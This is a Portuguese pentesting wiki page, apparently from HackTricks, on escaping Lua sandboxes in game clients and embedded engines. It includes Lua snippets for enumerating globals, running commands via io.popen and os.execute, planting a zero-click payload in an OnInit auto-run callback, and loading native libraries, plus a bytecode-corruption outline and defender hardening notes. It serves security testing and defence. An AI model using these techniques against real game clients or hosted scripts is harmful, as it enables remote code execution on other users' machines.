# Contornar sandboxes Lua (VMs embutidas, clientes de jogos)

{{#include ../../../banners/hacktricks-training.md}}

Esta página reúne técnicas práticas para enumerar e escapar de sandboxes Lua embutidos em aplicações (notadamente clientes de jogos, plugins ou engines de scripting dentro do app). Muitos engines expõem um ambiente Lua restrito, mas deixam globals poderosos acessíveis que permitem execução arbitrária de comandos ou até corrupção de memória nativa quando bytecode loaders estão expostos.

Principais ideias:
- Trate a VM como um ambiente desconhecido: enumere _G e descubra que primitivas perigosas estão acessíveis.
- Quando stdout/print estiver bloqueado, abuse de qualquer canal UI/IPC in-VM como um output sink para observar resultados.
- Se io/os estiver exposto, frequentemente você tem execução direta de comandos (io.popen, os.execute).
- Se load/loadstring/loadfile estiverem expostos, executar bytecode Lua craftado pode subverter a segurança de memória em algumas versões (≤5.1 verifiers are bypassable; 5.2 removed verifier), permitindo exploração avançada.

## Enumerar o ambiente sandbox

- Faça dump do ambiente global para inventariar tabelas/funções acessíveis:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se não houver print() disponível, reutilize canais in-VM. Exemplo de uma VM de script de housing de um MMO onde a saída do chat só funciona após uma chamada de som; o seguinte constrói uma função de saída confiável:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalize este padrão para o seu alvo: qualquer campo de texto, toast, logger ou callback de UI que aceite strings pode atuar como stdout para reconhecimento.

## Execução direta de comandos se io/os estiverem expostos

Se o sandbox ainda expõe as bibliotecas padrão io ou os, provavelmente você tem execução imediata de comandos:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:
- A execução ocorre dentro do processo cliente; muitas camadas anti-cheat/antidebug que bloqueiam debuggers externos não impedirão a criação de processos dentro da VM.
- Verifique também: package.loadlib (carregamento arbitrário de DLL/.so), require com módulos nativos, LuaJIT's ffi (se presente), e a debug library (pode elevar privilégios dentro da VM).

## Gatilhos Zero-click via auto-run callbacks

Se o aplicativo host envia scripts para os clientes e a VM expõe auto-run hooks (por exemplo, OnInit/OnLoad/OnEnter), coloque seu payload ali para drive-by compromise assim que o script carregar:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualquer callback equivalente (OnLoad, OnEnter, etc.) generaliza essa técnica quando scripts são transmitidos e executados no cliente automaticamente.

## Primitivas perigosas para procurar durante recon

Durante a enumeração de _G, procure especificamente por:
- io, os: io.popen, os.execute, file I/O, acesso a variáveis de ambiente (env).
- load, loadstring, loadfile, dofile: executar código-fonte ou bytecode; suporta o carregamento de bytecode não confiável.
- package, package.loadlib, require: carregamento dinâmico de bibliotecas e superfície do módulo.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, e hooks.
- LuaJIT-only: ffi.cdef, ffi.load para chamar código nativo diretamente.

Exemplos mínimos de uso (se acessíveis):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalação opcional: abusando de carregadores de bytecode do Lua

Quando load/loadstring/loadfile estão acessíveis mas io/os estão restritos, a execução de crafted Lua bytecode pode levar a divulgação de memória e primitivas de corrupção. Pontos chave:
- Lua ≤ 5.1 vinha com um verificador de bytecode que tem bypasses conhecidos.
- Lua 5.2 removeu o verificador completamente (posicionamento oficial: aplicações deveriam simplesmente rejeitar precompiled chunks), ampliando a superfície de ataque se o carregamento de bytecode não for proibido.
- Fluxos de trabalho típicos: leak pointers via in-VM output, craft bytecode para criar type confusions (p.ex., em torno de FORLOOP ou outros opcodes), e então pivotar para arbitrary read/write or native code execution.

Este caminho é específico do engine/versão e requer RE. Veja as referências para deep dives, exploitation primitives, e exemplos de gadgetry em jogos.

## Notas de detecção e hardening (para defensores)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
